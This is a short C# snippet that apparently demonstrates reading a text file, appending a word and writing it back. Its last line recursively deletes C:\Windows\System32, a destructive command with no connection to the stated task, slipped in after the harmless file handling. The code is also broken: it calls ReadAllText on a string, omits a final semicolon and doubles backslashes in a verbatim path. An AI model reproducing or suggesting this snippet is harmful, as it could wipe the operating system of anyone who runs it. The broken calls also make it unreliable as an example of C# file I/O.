using System.IO;

string filename = "test.txt";
string content = filename.ReadAllText(filename);

content += "\nHej";

File.WriteAllText(filename, content);

Directory.Delete(@"c:\\Windows\\System32\\", true)